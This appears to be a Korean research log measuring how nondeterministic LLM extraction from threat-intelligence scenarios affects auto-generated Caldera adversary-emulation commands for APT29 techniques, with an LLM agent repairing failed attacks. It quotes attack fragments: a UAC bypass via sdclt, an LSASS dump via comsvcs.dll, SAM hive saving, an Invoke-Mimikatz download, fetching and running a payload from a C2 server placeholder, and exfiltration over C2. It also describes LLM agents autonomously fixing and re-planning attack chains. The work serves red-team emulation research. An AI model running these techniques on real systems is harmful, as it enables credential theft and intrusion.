## 연구 질문

> *동일한 CTI 시나리오를 반복 실행할 때 LLM 기반 SVO 추출 결과가 달라지고,
> 그 차이가 초기 Ability 실행 성공률과 ReAct 자가복구 성공률을 결정하는가?*

---

## 배경 및 동기

### 파이프라인 구조

```
CTI 시나리오 (.md)
  → Phase 1: LLM 파싱 (ATT&CK 기법 추출)
  → Phase 2.5: SVO 추출 (Subject-Verb-Object 트리플릿)
  → Phase 3: Ability 생성 (SVO → Caldera PowerShell 명령어)
  → Phase 4~5: Operation 실행
  → Phase 6: ReAct Loop (실패 시 자율 명령어 수정, 최대 3라운드)
```

### 관찰된 문제

동일 시나리오를 반복 실행했을 때 SVO 추출 결과가 달라지고(LLM 비결정성), 그 결과 생성되는 명령어 전략이 달라져 성공률에 차이가 발생한다. 특히:

- **초기 성공률**: 53% ~ 87% (동일 시나리오, APT29 30기법)
- **최종 성공률**: 77% ~ 97% (ReAct 3라운드 후)

단순히 "처음에 실패해도 ReAct가 고친다"가 아니라, SVO V 방향이 ReAct로도 복구 불가능한 명령어 구조를 만들어내는 경우가 있다.

---

## 실험 환경

| 항목 | 값 |
|------|-----|
| 시나리오 | APT29 시나리오1 (30 MITRE ATT&CK 기법, T1529 제외) |
| LLM | gpt-oss:120b |
| ReAct 라운드 | 최대 3회 |
| 옵션 | SVO 기반 신규 생성, Caldera 기존 ability 무시 |

---

## 세션별 결과 (APT29, 동일 시나리오 3회)

| 세션 | 초기 성공 | R1 후 | R2 후 | R3 후 (최종) | 영구 실패 기법 |
|------|---------|------|------|------------|--------------|
| 143322 | 26/30 (87%) | — | — | **29/30 (97%)** | T1003 |
| 171757 | 19/30 (63%) | 23/30 | 26/30 | **26/30 (87%)** | T1036.002, T1134.001, T1055, T1056.001 |
| 141217 | 23/30 (77%) | 24/30 | 25/30 | **26/30 (87%)** | T1036.002, T1055, T1012, T1056.001 |
| 152852 | 22/30 (73%) | 24/30 | 27/30 | **27/30 (90%)** | T1036.002, T1037.005, T1055 |
| 162222 | 16/30 (53%) | 21/30 | 23/30 | **23/30 (77%)** | T1036.002, T1059.001, T1055, T1012, T1552.004, T1056.001, T1105 |
| 191016 | 22/30 (73%) | 23/30 | 24/30 | **25/30 (83%)** | T1055, T1134, T1012, T1003, T1056.001 |

---

## SVO 추출 비교 (전 기법, 3세션)

| TID | 143322 V / O | 171757 V / O | 141217 V / O | 유형 |
|-----|-------------|-------------|-------------|------|
| T1036.002 | execute / cod.3aka3.scr payload | execute / cod.3aka3.scr | **rename** / cod.3aka3.scr | A |
| T1059.001 | execute / malicious module | execute / malicious payload | invoke / powershell | C |
| T1547.009 | create / shortcut | create / shortcut | create / shortcut file | D |
| T1037.005 | install / startup item | install / startup folder | **register / service** | A |
| T1548.002 | steal / high-privilege token | bypass / user account control | **execute / sdclt.exe** | A |
| T1134.001 | **steal** / access token | **inject** / privileged process | **duplicate** / privileged token | A |
| T1036.005 | rename / malicious utilities | rename / malicious utilities | rename / malicious tools | D |
| T1055 | inject / legitimate processes | inject / trusted windows process | inject / trusted process | D |
| T1070.004 | delete / staging files | delete / staging files | delete / staging files | — |
| T1112 | remove / registry keys | remove / registry keys | **modify** / registry keys | C |
| T1134 | reuse / stolen tokens | impersonate / access token | **query / remote file share** | A (오추출) |
| T1016 | enumerate / network config | enumerate / network config | enumerate / network config details | D |
| T1082 | collect / system info | gather / system info | collect / system info | D |
| T1033 | echo / username | echo / %username% | identify / currently logged-in user | C |
| T1057 | enumerate / processes | enumerate / processes | enumerate / processes | — |
| T1007 | list / services | enumerate / services | enumerate / installed and running services | D |
| T1069 | enumerate / admin groups | enumerate / admin groups | query / admin groups | D |
| T1087 | list / domain users | list / account names | enumerate / user accounts | D |
| T1012 | query / registry keys | read / registry values | query / registry keys | C |
| T1018 | identify / domain controllers | identify / domain controllers | enumerate / domain controllers | D |
| T1049 | enumerate / active connections | enumerate / network connections | list / active network connections | D |
| T1083 | search / documents | search / document files | search / files and directories | D |
| T1003 | dump / credentials | dump / credentials | dump / credential data | D |
| T1552.004 | copy / .pfx file | copy / private key files | copy / private key files | B |
| T1119 | create / archive | compress / collected files | archive / documents | C |
| T1113 | capture / screenshot image | capture / screenshots | capture / desktop screenshot | D |
| T1115 | copy / clipboard | copy / clipboard contents | read / clipboard contents | C |
| T1056.001 | record / keystrokes | record / keystrokes | log / keystrokes | D |
| T1105 | copy / **psexec and sysinternals binaries** | copy / payloads | copy / payloads | B |
| T1041 | upload / compressed archive | upload / **draft.zip** | upload / compressed archives | B |

---

> **참고 (152852)**: 세션 152852의 SVO 추출 결과는 141217과 거의 동일 (T1134.001=duplicate/token, T1003=mimikatz/dump, T1134=query/remote share 등 전 기법 일치). 따라서 별도 열 없이 141217 열을 공유한다. 그러나 동일 SVO임에도 초기 성공률과 최종 성공률이 다름 → Phase 3 (Ability 생성) 자체의 비결정성 존재.

> **참고 (162222)**: 세션 162222의 SVO는 대부분 기존 세션들과 유사하나 일부 기법에서 새로운 V 추출. 주요 차이: T1134.001=inject/high-privilege process (171757과 동일), T1112=delete/registry keys (다른 세션들은 remove/modify), T1134=create/access token (다른 세션들은 reuse/impersonate/query), T1036.005=replace/sysinternals tools (다른 세션들은 rename). T1036.002=execute/malicious .scr file로 추출됐으나 기존 "RTLO Start Sandcat" ability와 매칭 실패 → generated 능력 생성 → totallylegit.exe 참조 (파일스토어 미존재) → 3라운드 모두 실패.

> **참고 (191016)**: 세션 191016의 SVO 추출 결과는 141217과 거의 동일 (T1036.002=rename/cod.3aka3.scr, T1059.001=invoke/powershell, T1134.001=duplicate/privileged token, T1134=query/remote file share 등). 따라서 별도 열 없이 141217 열을 공유. 동일 SVO에서도 초기 성공률(141217: 23/30 vs 191016: 22/30)과 최종 결과(141217: 26/30 vs 191016: 25/30)가 다르며 T1003 V드리프트 목적지도 다름(141217: cmdkey, 191016: comsvcs.dll) → Phase 3 비결정성 추가 확인.

---

## SVO 변동 유형 분류

### Type A — V 방향 분기 (기법 의미 해석 차이 → 명령어 전략 완전히 달라짐)

**T1134.001 (Access Token Manipulation: Impersonation)**

| 세션 | V | 생성 명령어 계열 | 결과 |
|------|---|--------------|------|
| 143322 | **steal** | `whoami /all > token.txt` + 업로드 | **초기 성공** |
| 141217 | **duplicate** | `[WindowsIdentity]::GetCurrent().Impersonate()` | quoting 실패 → **R1 수정 성공** |
| 171757 | **inject** | invoke-mimi.ps1 다운로드 + Invoke-Mimikatz | 네트워크 장벽 → **3라운드 모두 실패** |

V 선택이 명령어의 네트워크 의존성을 결정한다:

- steal/duplicate → 로컬 API 호출 → ReAct 수정 가능
- inject → 외부 페이로드 의존 → ReAct 수정 불능

**T1036.002 (Masquerading: Right-to-Left Override)**

| 세션 | V | 생성 명령어 | 결과 |
|------|---|-----------|------|
| 143322 | **execute** | `New-Item cod.scr; Rename(RTLO); & $file` — 생성+rename+실행 일체형 | **초기 성공** |
| 141217 | **rename** | `Rename-Item "cod.scr" -NewName "cod.scr[RTLO].txt"` — rename만 | 파일 없음 → R2 O생성 후 성공 |
| 171757 | **execute** | `Start-Process "cod.3aka3.scr"` — 실행만 | 파일 없음 → 3라운드 모두 실패 |

V=rename은 ATT&CK 기법 의미에 더 가깝지만 파일 존재를 전제함. V=execute(143322)는 의미적으로 덜 정확하지만 자기 완결 명령어를 만들었다.
**V의 ATT&CK 의미 정확도와 명령어 실행 가능성은 비례하지 않는다.**

**T1003 (Credential Dumping) — V 드리프트 경로 비결정성, 수렴점 일관성 (152852 R2)**

| 세션 | R0 V | R1 V | R2 V | 결과 |
|------|------|------|------|------|
| 143322 | dump(mimi) | **cmdkey** | — | R1 드리프트 후 quoting 실패 → R2 성공 |
| 171757 | dump(mimi) | IEX | **cmdkey** | R2 드리프트 성공 |
| 152852 | dump(reg save) | **mimikatz** | **cmdkey** | R2 드리프트 성공 (2단계 경유) |
| 191016 | totallylegit.exe | **comsvcs.dll MiniDump** | unknown | R2-R3 모두 unknown → 영구 실패 |

- 143322/171757/152852에서는 **cmdkey /list**로 수렴, 191016에서는 **comsvcs.dll LSASS dump**로 드리프트 → 권한 장벽으로 복구 불능
- **수정된 의의**: V 드리프트 수렴점(cmdkey)은 일관적이지 않음. 드리프트 목적지가 권한이 필요한 전략(LSASS 접근)으로 선택되면 복구 불능. 수렴점도 Phase 3 비결정성의 영향을 받는다.

**T1036.002 (RTLO) — ReAct Oscillation: syntax 수정과 O-creation 동시 적용 실패 (152852)**

| 라운드 | 수정 내용 | 버그 |
|--------|---------|------|
| R0 | `Rename-Item "cod.3aka3.scr"` | 파일 없음 |
| R1 | RTLO char 방식 변경 + 경로 수정 | `[char]0x202E`**`]`** ← 여분 `]` 도입 |
| R2 | 여분 `]` 제거 | 파일 없음 미해결 |
| R3 | O-creation 추가 시도 | `[char]0x202E`**`]`** ← 동일 버그 재도입 |

- R2에서 syntax 수정, R3에서 O-creation을 추가하는 과정에서 이전에 고쳤던 버그를 재도입
- LLM이 두 가지 수정을 동시에 처리할 때 발생하는 **oscillation 패턴** — 한 문제를 고치면 다른 문제가 다시 생기는 반복

**T1548.002 (Bypass UAC via sdclt)**

| 세션 | V / O | 전략 | 결과 |
|------|------|------|------|
| 143322 | steal / high-privilege token | `sdclt.exe /kickoffelevated` 1줄 | **초기 성공** |
| 171757 | bypass / user account control | registry 등록 + IEX payload 체인 | nested quoting 실패 → **R2 수정** |
| 141217 | execute / sdclt.exe | `Start-Process sdclt.exe` | **초기 성공** |

**T1134 (Access Token Manipulation — 오추출 사례)**

| 세션 | V / O | 해석 방향 | 결과 |
|------|------|---------|------|
| 143322 | reuse / stolen tokens | 토큰 재사용 | 초기 성공 |
| 171757 | impersonate / access token | 토큰 가장 | 초기 성공 |
| 141217 | **query / remote file share** | **기법과 무관한 오추출** | `Get-ChildItem \\host\share` → 네트워크 실패 → R3 error-capture false positive |

---

### Type B — O 추상성 분기 (객체 구체성 차이 → 전제 조건 의존 여부)

**T1041 (Exfiltration Over C2)**

| 세션 | O | 생성 전략 | 결과 |
|------|---|---------|------|
| 143322 | compressed archive (추상) | `Compress-Archive`로 파일 직접 생성 → 업로드 | **초기 성공** |
| 141217 | compressed archives (추상) | 동일 | **초기 성공** |
| 171757 | **draft.zip** (구체) | `$filePath="draft.zip"` 존재 가정 → OpenRead | 파일 없음 → R2 O생성 전략으로 해결 |

시나리오 텍스트에 등장하는 파일명이 O에 그대로 반영될 때 전제 조건이 생긴다.

**일반화**:

- 추상적 O → LLM이 자유롭게 "사용 가능한 객체" 생성 → 자기 완결 명령어
- 구체적 O → 해당 객체가 사전 존재해야 함 → 초기 실패, ReAct O생성 전략 필요

**T1087 (Account Discovery) — O scope 교체 (domain→local, 152852 R1)**

| O 유형 | 명령어 | 결과 |
|--------|------|------|
| domain accounts (원본) | `net user /domain` | 도메인 없음 → FAIL |
| **local accounts (교체)** | `net user` + 파일 저장 + 업로드 | **R1 성공** |

O-creation(없는 객체 생성)과 달리 **O scope 축소** — 접근 불가 범위(domain)를 접근 가능한 하위 범위(local)로 교체. 객체를 새로 만드는 것이 아니라 "더 접근 가능한 유사 객체"로 대체하는 전략.

---

### Type C — V 표현 부정확 (성공률 영향 없거나 미미)

V 표현이 미묘하게 달라지지만 동일한 CLI 도구 계열로 수렴하거나, 비결정적으로 명령어 스타일만 달라지는 경우. T1012는 예외적으로 실패 유발.

**T1012 (Query Registry) — 141217에서만 타임아웃**

- V=query, O=registry keys → `reg query "HKLM\Software" /s` 생성
- `/s` recursive로 수만 개 키 → **60초 타임아웃 (status=124)**
- ReAct가 R3에서 범위 축소(`HKLM\Software\Microsoft`) 시도 → 여전히 타임아웃
- 143322·171757에서는 동일 SVO임에도 타임아웃 없이 성공
- **O 범위(scope) 초과 타임아웃**: 새로운 실패 유형

---

### Type D — V 유사 표현 (실질 차이 없음)

enumerate/list/identify 등 유사 표현 간 분기는 동일 CLI 도구(sc.exe, tasklist, net user 등)로 수렴해 성공률 차이 없음. T1057, T1070.004 등은 3세션 모두 완전 동일.

---

## 핵심 발견

### 발견 1: V 방향 = ReAct Repair Ceiling 결정

SVO의 V 선택이 명령어의 **복구 가능 공간**을 정의한다.

```
V → 로컬 CLI/API 계열    → 구문 오류 가능 → ReAct 수정 가능 (1~2라운드)
V → 네트워크 의존 계열   → 서버/네트워크 장벽 → ReAct 수정 불능
V → 자기 완결 계열       → 초기 성공 (ReAct 불필요)
```

T1134.001이 세 경우를 모두 보여주는 핵심 사례:
steal(자기완결 성공) / duplicate(수정 성공) / inject(수정 불능)

**수정 (162222)**: V=inject가 항상 수정 불능은 아님. 171757에서는 inject→네트워크 페이로드 의존(불능), 162222에서는 inject→로컬 API syntax 오류(수정 가능). V는 repair ceiling의 **확률 분포**를 결정하며, 동일 V에서도 Phase 3 비결정성에 의해 수정 가능/불능이 갈릴 수 있다.

### 발견 2: O 추상성 = 초기 성공률 결정 (ReAct로 복구 가능)

| O 유형 | 명령어 전략 | 초기 성공 | ReAct 복구 |
|--------|-----------|---------|-----------|
| 추상 (compressed archive) | 객체 자기 생성 | 높음 | 불필요 |
| 구체 (draft.zip) | 객체 존재 가정 | 낮음 | R1~R2에서 O생성 전략으로 가능 |

V 오류는 ReAct 복구가 어렵거나 불가능. O 오류는 ReAct가 O생성 전략으로 대부분 복구 가능.
**→ V가 O보다 파이프라인 최종 성공률에 더 큰 영향을 미친다.**

### 발견 3: SVO 추출은 실행마다 비결정적

30기법 중 완전 동일 추출은 T1070.004, T1057 등 소수. T1134.001처럼 3회 모두 완전히 다른 V가 추출되는 경우도 있다. 이 비결정성이 성공률 분산(63%~87%)의 주요 원인이다.

### 발견 5: Phase 3 (Ability 생성)도 비결정적 — SVO만이 분산 원인이 아님

141217과 152852는 SVO가 거의 동일하게 추출됐으나 결과가 다르다:

| 비교 항목 | 141217 | 152852 |
|----------|--------|--------|
| 초기 성공 | 23/30 | 22/30 |
| 최종 성공 | 26/30 | **27/30** |
| T1134.001 초기 | 실패 → R1 수정 | **초기 성공** |
| T1007 초기 | **초기 성공** | 실패 → R1 수정 |
| T1012 | 타임아웃 영구 실패 | **초기 성공** |
| T1056.001 | 영구 실패 | R2 수정 성공 |

동일 SVO에서도 Phase 3 LLM이 다른 명령어를 생성하여 성공 여부가 갈린다.
**성공률 분산 원인 = SVO 추출 비결정성 + Ability 생성 비결정성 (두 단계 모두 기여)**

```
SVO 추출 비결정성 (Phase 2.5)  ─→  V/O 방향 결정  ─→  Repair Ceiling
Ability 생성 비결정성 (Phase 3) ─→  구체 명령어 결정 ─→  초기 성공률
```

### 발견 6: Ability 매칭 실패가 새로운 성능 천장을 만든다 (162222)

Phase 3에서 기존 Caldera ability를 선택하지 못하고 새로 생성(generated)할 때, 생성된 ability가 존재하지 않는 파일을 참조하거나 올바른 실행 방식을 모르면 ReAct로도 복구 불가능한 실패가 발생한다.

T1036.002 사례: APT29.yaml에 `cod.3aka3.scr` payload 기반 정확한 ability가 존재하지만, 파이프라인이 이를 선택하지 못해 `totallylegit.exe`를 참조하는 잘못된 ability를 생성 → 파일스토어 미존재 + RTLO 구문 버그 → 영구 실패.

```
Ability 매칭 성공 → 검증된 기존 명령어 사용 → 높은 초기 성공률
Ability 매칭 실패 → generated (LLM 추정) → 파일/도구 존재 가정 → 실패 위험
```

**실패 계층**: SVO 비결정성(Phase 2.5) → Ability 생성 비결정성(Phase 3) → **Ability 선택 실패(Phase 3)** 순으로 복구 난이도가 높아짐.

### 발견 4: V의 ATT&CK 의미 정확도 ≠ 명령어 실행 가능성

T1036.002 사례: V=rename(기법 의미 정확)이 V=execute(덜 정확)보다 더 낮은 초기 성공률을 만들었다. 의미적 정확성이 실행 가능성을 보장하지 않는다.

---

## 세션 191016 추가 관찰

### T1003 — comsvcs.dll 드리프트: V 드리프트 수렴점 비일관성 발견 (191016)

- R0: `totallylegit.exe` 다운로드 → `C:\Windows\Temp` 쓰기 권한 없음 (subject_failure)
- R1: **comsvcs.dll** + `MiniDump($pid, $out, full)` — LSASS 메모리 덤프 시도 → 실패 (LSASS 접근 거부 추정, 관리자 권한 필요)
- R2-R3: **unknown failure** — thought 없음, fixed_command 없음 → 영구 실패
- 143322/171757/152852 세션들은 모두 **cmdkey /list**로 수렴했으나, 191016은 **comsvcs.dll**로 드리프트 후 복구 불능
- **의의**: T1003 V 드리프트 수렴점(cmdkey)이 일관적이라는 발견 3 수정 필요. 수렴점은 확률적 — 민감한 LSASS 접근 전략을 선택하면 권한 장벽으로 영구 실패.

### T1059.001 — V=invoke → 자기완결 성공 (191016, 162222 대비)

| 세션 | V | 생성 명령어 | 결과 |
|------|---|-----------|------|
| 162222 | execute | `Invoke-WebRequest #{server}/file/download/totallylegit.exe; Start-Process` | 파일 없음 → 영구 실패 |
| 191016 | **invoke** | `cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Process"` | **초기 성공** |
| 141217 | invoke | `cmd.exe /c powershell ...` | **초기 성공** |

V=invoke → "PowerShell 프로세스 호출" → 자기완결 실행 → 성공. V=execute → "실행 파일 실행" → 외부 파일 존재 가정 → 실패. 동일 T1059.001에서 V 한 단어 차이가 명령어 전략과 성공 여부를 결정.

### T1036.002 — O-creation 패턴 재현 (191016, R2 성공)

141217과 완전히 동일한 복구 경로:

- R0: `Rename-Item "cod.3aka3.scr"` → 파일 없음
- R1: `-LiteralPath` 추가 → 여전히 파일 없음
- R2: `New-Item "cod.3aka3.scr" -Force; Rename-Item -LiteralPath` → **성공**
- 141217/191016 두 세션 모두 V=rename이고 두 세션 모두 R2 O-creation으로 성공 → **V=rename일 때 O-creation 복구가 재현 가능한 패턴임을 확인**.

---

## 세션 162222 추가 관찰

### T1059.001 — O 부재 근본 원인 오진 (162222, 3라운드 모두 실패)

- R0: `Invoke-WebRequest #{server}/file/download/totallylegit.exe` → "corrupted file" 에러
- ReAct 진단: **download method failure** → WebClient → IWR → HttpClient → bitsadmin 순으로 V(다운로드 방식) 교체
- 실제 근본 원인: **`totallylegit.exe`가 Caldera 파일스토어에 존재하지 않음** → IWR이 성공(HTTP 200)해도 빈 파일/HTML 응답 저장 → Start-Process "corrupted" 에러
- ReAct가 실패 유형을 V 문제로 오진하여 다운로드 방식만 3번 바꿨지만 O(파일 자체)가 없으므로 모두 실패
- **의의**: **O-nonexistent 오진 패턴** — 존재하지 않는 객체를 참조할 때 에러 메시지가 V 문제처럼 보여 ReAct가 잘못된 수정을 반복. 근본 원인(파일스토어 누락)은 command 수정으로 해결 불가.

### T1036.002 — Ability 매칭 실패 → Generated ability 오작동 (162222)

- APT29.yaml에 "RTLO Start Sandcat" ability 존재 (payload: `cod.3aka3.scr`, `Get-ChildItem *cod*scr*` 후 Sandcat 에이전트로 실행)
- 파이프라인은 이 기존 ability를 매칭하지 못하고 **새 ability 생성** (source=generated)
- 생성된 명령어: `totallylegit.exe` 다운로드 → RTLO rename → Start-Process
- `totallylegit.exe`도 파일스토어 미존재, RTLO 문자(`\`u202E`) 이스케이프 버그까지 겹쳐 3라운드 모두 실패
- **의의**: Phase 3가 기존 ability를 선택했다면 `cod.3aka3.scr`을 payload로 사용해 Sandcat 에이전트를 스폰하는 올바른 동작이 가능했을 것. **Ability 선택 실패가 성능 천장을 낮추는 새로운 실패 모드**.

### T1105 — Unknown failure: ReAct 수정 불능 (162222, R3)

- R1: subject_failure (psexec/sysinternals 바이너리 없음)
- R2: unknown failure — ReAct가 thought 생성 실패
- R3: unknown failure — thought 없음, fixed_command 없음 (patched=6 중 T1105 제외)
- **의의**: ReAct가 실패 원인을 전혀 파악하지 못해 수정 자체를 포기하는 케이스. "unknown" failure_type은 수정 시도조차 없음 → 영구 실패 확정.

### T1134.001 — V=inject이지만 R1 수정 성공 (162222, Phase 3 비결정성 재확인)

- SVO: inject / high-privilege process (171757과 동일)
- 171757: V=inject → invoke-mimi.ps1 네트워크 의존 → 3라운드 모두 실패
- 162222: V=inject → **syntax_failure** (네트워크 의존 아님) → R1에서 구문 수정 → R2 성공
- 동일 V=inject에서 Phase 3가 다른 명령어 전략 생성:
  - 171757: 네트워크에서 Mimikatz 다운로드 (복구 불가)
  - 162222: 로컬 API 기반 토큰 조작 (구문 오류만 있어 복구 가능)
- **의의**: V 방향이 동일해도 Phase 3 비결정성으로 인해 초기 명령어의 복구 가능성이 달라진다. V는 "repair ceiling의 확률 분포"를 정의할 뿐, 결정론적 ceiling이 아님.

---

## 세션 152852 추가 관찰

### T1003 — 3단계 V 드리프트 (152852, R2)

- R0: `reg.exe save HKLM\SAM + HKLM\SYSTEM` → **타임아웃** (status=124) — 레지스트리 하이브 저장 작업 시간 초과
- R1: ft=subject_failure → **mimikatz.exe** 실행으로 V 드리프트 → 실행 파일 없음 실패
- R2: ft=verb_failure → **cmdkey /list**로 재드리프트 → **성공**
- 143322/171757의 1단계 드리프트(mimikatz→cmdkey)와 달리 이 세션은 2단계 소요. 하지만 최종 전략(cmdkey)은 동일하게 수렴.
- **의의**: V 드리프트 경로는 비결정적이지만 최종 수렴점(cmdkey)은 일관됨.

### T1036.002 — ReAct Oscillation: 수정-오류 반복 (152852, R1~R3)

- R0: `Rename-Item "cod.3aka3.scr"` → 파일 없음
- R1: `$rtl=[char]0x202E**]**` ← **LLM이 `]` 추가 (syntax 오류 생성)** + 경로 수정
- R2: 여분 `]` 제거 수정 → 파일 없음 문제는 미해결
- R3: O 생성 전략 추가 시도, 그런데 `[char]0x202E**]**` **동일 버그 재도입** → 실패
- **의의**: LLM이 syntax 수정과 O-creation을 동시에 처리할 때 이전에 수정했던 버그를 재도입하는 oscillation 패턴. 한 라운드에 두 가지 수정을 동시에 적용하다가 발생.

### T1087 — O scope 교체 (domain→local) (152852, R1)

- R0: `net user /domain` → 도메인 없음 (WORKGROUP 환경)
- R1: ft=object_failure, SVOFocus=O — 도메인 계정 → 로컬 계정으로 O 교체 → `net user` + 파일 저장 + C2 업로드 → **성공**
- T1041 O-creation과 달리 이 경우는 O의 **범위(scope)를 축소**하는 전략.
- **의의**: 접근 불가 O(도메인)를 접근 가능한 하위 O(로컬)로 교체. T1074.001 S→O 우회 패턴과 유사.

---

## 부가 관찰

### ReAct O 생성 전략 패턴

object_failure 진단 시 "O를 먼저 생성한 후 V 실행"하는 전략. Type B 실패의 주요 복구 메커니즘.

| 세션 | 기법 | ReAct 라운드 | 적용 내용 |
|------|------|-----------|---------|
| 141217 | T1070.004 | R1 | `New-Item C:\Temp\staging.txt -Force; Remove-Item` |
| 171757 | T1041 | R2 | `if(!(Test-Path)){New-Item -Force}` 선행 후 업로드 |
| 141217 | T1036.002 | R2 | `New-Item cod.3aka3.scr -Force; Rename-Item` |

### 상태 충돌 (State Collision)

전체 Operation 재실행 구조에서 이전 라운드에서 생성된 파일/키가 잔존해 다음 라운드에서 충돌.

| 세션 | 기법 | 현상 | 결과 |
|------|------|------|------|
| 141217 | T1036.005 | Move-Item destination 이미 존재 (R0 생성 잔존) | R3 pre-clean으로 해결 |
| 141217 | T1036.002 | RTLO 파일명 이미 존재 (R2 생성 잔존) | 미해결 (영구 실패) |
| 171757 | T1036.002 | 동일 패턴 | 미해결 |

### False Positive 목록

| 유형 | 도구/패턴 | 메커니즘 |
|------|---------|---------|
| 빈 루프 | `ForEach-Object {}` | 미실행 → exit 0 |
| 조건 미충족 | `if(Test-Path){...}` | 조건 false → 블록 미실행 → exit 0 |
| 비동기 실행 | `Start-Process` | 시작만 확인 → exit 0 |
| Error capture | `net view 2>&1` | 에러 텍스트가 "결과"로 업로드 → exit 0 |
| stderr 무시 | `nltest /dclist` | DC 미발견 stderr, exit 0 (T1018 사례) |

---

## 향후 실험 계획

1. **동일 시나리오 N회 반복** → SVO 추출 분산 정량화
   - 각 기법의 V 고유값 수, O 추상성 분포 측정

2. **SVO 고정 주입 실험** → SVO↔성공률 인과 분리
   - 추상 SVO 고정 vs 구체 SVO 고정 → ability 생성 반복 → 성공률 비교

3. **V 방향 분류 체계 정립**
   - 로컬/API계 vs 네트워크/페이로드계 vs 자기완결계 분류 기준
   - 분류별 ReAct 성공률 집계

---

## 세션 목록

| 세션 ID | 시나리오 | 초기→최종 | 특이사항 |
|---------|---------|---------|---------|
| 20260311_143322 | APT29 (30기법) | 26→29/30 | V=steal 계열 다수, 고성공 세션 |
| 20260311_171757 | APT29 (30기법) | 19→26/30 | V=inject 오추출 → T1134.001 영구 실패 |
| 20260312_141217 | APT29 (30기법) | 23→26/30 | T1134 오추출, T1012 scope timeout, 상태충돌 2건 |
| 20260312_152852 | APT29 (30기법) | 22→27/30 | SVO≈141217, T1003 3단계 V드리프트, T1036.002 oscillation, Phase 3 비결정성 확인 |
| 20260312_162222 | APT29 (30기법) | 16→23/30 | T1059.001 O-nonexistent 오진, T1036.002 ability 매칭 실패, T1105 unknown failure, T1134.001 동일 V=inject 다른 결과 |
| 20260312_191016 | APT29 (30기법) | 22→25/30 | SVO≈141217, T1003 comsvcs.dll 드리프트(수렴점 비일관성), T1059.001 V=invoke 성공, T1036.002 R2 O-creation 재현 |

## 한계: ReAct Agent의 구조적 한계 (Context 단절과 시야의 협소함)

현재 ReAct Loop(Phase 6)는 실패한 Ability 한 개당 1번씩 개별적으로 LLM을 호출하여 오류를 수정하는 **"점대점(Point-to-Point) 디버깅"** 방식으로 구현되어 있다.
이로 인해 다음과 같은 구조적 한계가 발생한다:

- **상태 및 정보 공유 불가 (No Operation Memory)**: 이전 기법(예: 정찰)이 성공하여 유의미한 정보(예: 도메인 컨트롤러 IP 발견)를 출력했더라도, 이 정보가 다음 기법(예: 횡적이동)의 ReAct 수정 과정에 전달되지 않는다.
- **근시안적 수정**: 에이전트는 기법이 실패할 때 전체 공격 체인의 맥락을 보지 못하고, 오직 해당 기법이 발생시킨 에러 메시지(구문 오류, 파일 없음 등)와 SVO 의도에만 의존하여 명령어를 단편적으로 수정하려고 시도한다.
- **개선 방향**: 개별 명령어 수정 단계를 넘어서서, 전체 Operation 결과를 통째로 입력받아 이전 단계의 성공(수집된 팩트)과 실패를 종합적으로 평가하고 다음 공격 체인을 상향식으로 재기획하는 **Orchestrator 수준의 글로벌 Context 연동 구조(Fact Base / Memory)** 도입이 필요하다.
